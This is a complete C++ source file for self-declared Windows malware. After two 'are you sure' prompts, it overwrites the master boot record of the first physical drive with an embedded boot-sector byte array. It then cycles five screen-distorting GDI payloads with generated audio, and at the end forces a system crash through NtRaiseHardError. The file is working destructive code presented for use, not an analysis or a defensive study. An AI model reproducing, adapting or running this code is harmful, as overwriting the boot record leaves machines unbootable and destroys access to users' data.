#define _USE_MATH_DEFINES 1
#include <Windows.h>
#include <cmath>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "kernel32.lib")
//externing rtladjustprivilege
EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
//externing ntraiseharderror
EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidRespnseOption, PULONG Response);
const unsigned char MasterBootRecord[] = {
	0x31, 0xC0, 0x8E, 0xD8, 0x31, 0xC0, 0xCD, 0x10, 0xB4, 0x01, 0xB9, 0x07,
	0x26, 0xCD, 0x10, 0xB6, 0x03, 0xB9, 0x12, 0x00, 0x51, 0xFE, 0xC6, 0xB2,
	0x0D, 0xB9, 0x0E, 0x00, 0xBB, 0x78, 0x00, 0xE8, 0xB6, 0x00, 0x80, 0xFE,
	0x15, 0x74, 0x09, 0x42, 0xB9, 0x0C, 0x00, 0x31, 0xDB, 0xE8, 0xA8, 0x00,
	0x59, 0xE2, 0xE1, 0xC6, 0x06, 0x00, 0x7F, 0x64, 0xB4, 0x02, 0xCD, 0x1A,
	0xA0, 0x02, 0x7F, 0x31, 0xD0, 0xB3, 0x1F, 0xF7, 0xE3, 0x40, 0xA2, 0x02,
	0x7F, 0x31, 0xD2, 0xBB, 0x07, 0x00, 0xF7, 0xF3, 0xC0, 0xE2, 0x03, 0x92,
	0xBA, 0x12, 0x04, 0xE8, 0xE5, 0x00, 0x75, 0xFE, 0xE8, 0xD2, 0x00, 0x31,
	0xC9, 0x8A, 0x0E, 0x00, 0x7F, 0x51, 0x60, 0x31, 0xC9, 0xBA, 0xB8, 0x0B,
	0xB4, 0x86, 0xCD, 0x15, 0x61, 0x50, 0xB4, 0x01, 0xCD, 0x16, 0x89, 0xC1,
	0x58, 0x74, 0x45, 0xE8, 0xAF, 0x00, 0x80, 0xFD, 0x4B, 0x74, 0x11, 0x80,
	0xFD, 0x48, 0x74, 0x1E, 0x80, 0xFD, 0x4D, 0x74, 0x10, 0xC6, 0x06, 0x00,
	0x7F, 0x0A, 0xEB, 0x23, 0x4A, 0xE8, 0xA7, 0x00, 0x74, 0x1D, 0x42, 0xEB,
	0x1A, 0x42, 0xE8, 0x9E, 0x00, 0x74, 0x14, 0x4A, 0xEB, 0x11, 0x88, 0xC3,
	0x40, 0x40, 0xA8, 0x07, 0x75, 0x02, 0x2C, 0x08, 0xE8, 0x8C, 0x00, 0x74,
	0x02, 0x88, 0xD8, 0xE8, 0x77, 0x00, 0x50, 0x30, 0xE4, 0xCD, 0x16, 0x58,
	0x59, 0xE2, 0xA2, 0xE8, 0x67, 0x00, 0xFE, 0xC6, 0xE8, 0x74, 0x00, 0x74,
	0x8A, 0xFE, 0xCE, 0xE8, 0x5F, 0x00, 0xE8, 0x16, 0x00, 0xE9, 0x5B, 0xFF,
	0xB4, 0x02, 0xCD, 0x10, 0xB8, 0x20, 0x09, 0xCD, 0x10, 0xC3, 0xB4, 0x02,
	0xCD, 0x10, 0xB4, 0x08, 0xCD, 0x10, 0xC3, 0x60, 0xB6, 0x15, 0xFE, 0xCE,
	0x74, 0x39, 0x31, 0xDB, 0xB9, 0x0C, 0x00, 0xB2, 0x0E, 0xE8, 0xE6, 0xFF,
	0xC0, 0xEC, 0x04, 0x74, 0x02, 0x43, 0x42, 0xE2, 0xF4, 0x80, 0xFB, 0x0C,
	0x75, 0xE4, 0x60, 0xB2, 0x0E, 0xB9, 0x0C, 0x00, 0x51, 0xFE, 0xCE, 0xE8,
	0xCC, 0xFF, 0xFE, 0xC6, 0x88, 0xE3, 0xB1, 0x01, 0xE8, 0xB9, 0xFF, 0x42,
	0x59, 0xE2, 0xED, 0x61, 0xFE, 0xCE, 0x75, 0xE2, 0xE8, 0xC0, 0xFF, 0x61,
	0xC3, 0x31, 0xDB, 0xEB, 0x09, 0x88, 0xC3, 0xC0, 0xEB, 0x03, 0x43, 0xC0,
	0xE3, 0x04, 0x43, 0x89, 0xDF, 0xEB, 0x03, 0xBF, 0x00, 0x00, 0x60, 0x31,
	0xDB, 0x88, 0xC3, 0x8B, 0x87, 0x86, 0x7D, 0x31, 0xDB, 0xB9, 0x04, 0x00,
	0x51, 0xB1, 0x04, 0xF6, 0xC4, 0x80, 0x74, 0x1D, 0x50, 0x09, 0xFF, 0x74,
	0x0E, 0x60, 0x89, 0xFB, 0x30, 0xC0, 0xB9, 0x01, 0x00, 0xE8, 0x70, 0xFF,
	0x61, 0xEB, 0x09, 0xE8, 0x74, 0xFF, 0xC0, 0xEC, 0x04, 0x74, 0x01, 0x43,
	0x58, 0xD1, 0xE0, 0x42, 0xE2, 0xD9, 0x80, 0xEA, 0x04, 0xFE, 0xC6, 0x59,
	0xE2, 0xCE, 0x08, 0xDB, 0x61, 0xC3, 0x44, 0x44, 0x00, 0xF0, 0x44, 0x44,
	0x00, 0xF0, 0x60, 0x22, 0x00, 0xE2, 0x40, 0x64, 0x00, 0x8E, 0x60, 0x44,
	0x00, 0x2E, 0x20, 0x62, 0x00, 0xE8, 0x00, 0x66, 0x00, 0x66, 0x00, 0x66,
	0x00, 0x66, 0x00, 0xC6, 0x40, 0x26, 0x00, 0xC6, 0x40, 0x26, 0x00, 0x4E,
	0x40, 0x4C, 0x00, 0xE4, 0x80, 0x8C, 0x00, 0x6C, 0x40, 0x8C, 0x00, 0x6C,
	0x40, 0x8C, 0x80, 0x00, 0x01, 0x00, 0x17, 0x00, 0x02, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};

void mbr()
{
    DWORD dwBytesWritten;
    HANDLE hDevice = CreateFileW(
        L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
        FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
        OPEN_EXISTING, 0, 0);
    WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0);
    CloseHandle(hDevice);
}

DWORD WINAPI payload1(LPVOID lpParam) {
	HDC hdc = GetDC(HWND_DESKTOP);
	int X = GetSystemMetrics(SM_CXSCREEN);
	int Y = GetSystemMetrics(SM_CYSCREEN);
	
	while (TRUE)
	{
		BitBlt(hdc, rand() % (X - 0), rand() % (Y - 0), rand() % (X - 0), rand() % (Y - 0), hdc, rand() % (X - 0), rand() % (Y - 0), SRCCOPY);
	}
}
DWORD WINAPI payload2(LPVOID lpParam) {
	while(1){
		HDC hdc = GetDC(0);
		int x = GetSystemMetrics(0);
		int y = GetSystemMetrics(1);
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(hdc, brush);
		Pie(hdc, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y);
    	DeleteObject(brush);
    	ReleaseDC(NULL, hdc);
    	Sleep(10);
	}
}
VOID WINAPI ci(int x, int y, int w, int h)
{
    HDC hdc = GetDC(0);
    HRGN hrgn = CreateEllipticRgn(x, y, w+x, h+y);
    SelectClipRgn(hdc, hrgn);
    BitBlt(hdc, x, y, w, h, hdc, x, y, NOTSRCCOPY);
    DeleteObject(hrgn);
    ReleaseDC(NULL, hdc);
}
DWORD WINAPI payload2dot1(LPVOID lpParam) {
    RECT rect;
    GetWindowRect(GetDesktopWindow(), &rect);
    int w = rect.right - rect.left - 500, h = rect.bottom - rect.top - 500;
    for (int t = 0;; t++)
    {
        const int size = 1000;
        int x = rand()%(w+size)-size/2, y = rand()%(h+size)-size/2;
        for (int i = 0; i < size; i+=100)
        {
            ci(x-i/2, y-i/2, i, i);
            Sleep(10);
        }
    }
}
DWORD WINAPI payload3(LPVOID lpParam) {
    HWND v3; 
    HBITMAP h; 
    HDC hdcSrc; 
    HDC hdc; 
    void* lpvBits;
    int nHeight; 
    int nWidth; 
    DWORD v12; 
    int j; 
    int v14; 
    int i; 
    v12 = GetTickCount();
    nWidth = GetSystemMetrics(0);
    nHeight = GetSystemMetrics(1);
    lpvBits = VirtualAlloc(0, 4 * nWidth * (nHeight + 1), 0x3000u, 4u);
    for (i = 0; ; i = (i + 1) % 2)
    {
        hdc = GetDC(0);
        hdcSrc = CreateCompatibleDC(hdc);
        h = CreateBitmap(nWidth, nHeight, 1u, 0x20u, lpvBits);
        SelectObject(hdcSrc, h);
        BitBlt(hdcSrc, 0, 0, nWidth, nHeight, hdc, 0, 0, 0xCC0020u);
        GetBitmapBits(h, 4 * nHeight * nWidth, lpvBits);
        v14 = 0;
        if (GetTickCount() - v12 > 0xA)
            rand();
        for (j = 0; nHeight * nWidth > j; ++j)
        {
            if (!(j % nHeight) && !(rand() % 110))
                v14 = rand() % 24;
            *((BYTE*)lpvBits + 4 * j + v14) -= 5;
        }
        SetBitmapBits(h, 4 * nHeight * nWidth, lpvBits);
        BitBlt(hdc, 0, 0, nWidth, nHeight, hdcSrc, 0, 0, 0xCC0020u);
        DeleteObject(h);
        DeleteObject(hdcSrc);
        DeleteObject(hdc);
    }
}
DWORD WINAPI payload4(LPVOID lpParam) 
{
    while (1) {
        HDC hdc = GetDC(0);
        int x = SM_CXSCREEN;
        int y = SM_CYSCREEN;
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        BitBlt(hdc, rand() % 222, rand() % 222, w, h, hdc, rand() % 222, rand() % 222, NOTSRCERASE);
        Sleep(10);
        ReleaseDC(0, hdc);
    }
}
DWORD WINAPI payload5(LPVOID lpParam) {
	int ticks = GetTickCount(), w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		HDC hdc = GetDC(0), hdcMem = CreateCompatibleDC(hdc);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcMem, hbm);
		BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		int v = 0;BYTE bt = 0;
		if ((GetTickCount() - ticks) > 60000) bt = rand() & 0xffffff;
		for (int i = 0; w * h > i; i++) {
			if (i % h == 0 && rand() % 100 == 0) v = rand() % 50;
			((BYTE*)(data + i))[v ? 252 : 252] += ((BYTE*)(data + i))[i % 3] ^ bt;
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(hdc, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		DeleteObject(hbm); DeleteObject(hdcMem);
		DeleteObject(hdc);
	}
}
VOID WINAPI sound1() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[16000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(6^(t^(t>>9|t>>20|t>>8)));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound2() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t*t>>5|(t>>1)*(t>>8));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound3() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t*(t&t+(t>>15|1)*(t-1280&t)>>10));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound4() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(((t>>3)&666)*t);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound5() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t*(t>>8*(t>>15|t>>8)&(20|5*(t>>19)>>t|t>>3)));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d)
{
    if (MessageBoxW(NULL, L"WARNING THIS IS A MALWARE?", L"J143317.78+101123.3", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
    {
        ExitProcess(0);
    }
    else
    {
        if (MessageBoxW(NULL, L"LAST WARNING, ARE YOU SURE?", L"Last Warning!!!", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
        {
            ExitProcess(0);
        }
        else
        {
            mbr();
            HANDLE thread1 = CreateThread(0, 0, payload1, 0, 0, 0);
            sound1();
            Sleep(30000);
            TerminateThread(thread1, 0);
            CloseHandle(thread1);
            InvalidateRect(0, 0, 0);
            HANDLE thread2 = CreateThread(0, 0, payload2, 0, 0, 0);
            HANDLE thread2dot1 = CreateThread(0, 0, payload2dot1, 0, 0, 0);
            sound2();
            Sleep(30000);
            TerminateThread(thread2, 0);
            TerminateThread(thread2dot1, 0);
            CloseHandle(thread2);
            CloseHandle(thread2dot1);
            InvalidateRect(0, 0, 0);
            HANDLE thread3 = CreateThread(0, 0, payload3, 0, 0, 0);
            sound3();
            Sleep(30000);
            TerminateThread(thread3, 0);
            CloseHandle(thread3);
            InvalidateRect(0, 0, 0);
            HANDLE thread4 = CreateThread(0, 0, payload4, 0, 0, 0);
            sound4();
            Sleep(30000);
            TerminateThread(thread4, 0);
            CloseHandle(thread4);
            InvalidateRect(0, 0, 0);
            HANDLE thread5 = CreateThread(0, 0, payload5, 0, 0, 0);
            sound5();
            Sleep(30000);
            //boolean
			      BOOLEAN b;
			      //bsod response
			      unsigned long response;
			      //process privilege
			      RtlAdjustPrivilege(19, true, false, &b);
			      //call bsod
			      NtRaiseHardError(0xC000025A, 0, 0, 0, 6, &response);
            Sleep(-1);
        }
    }
}
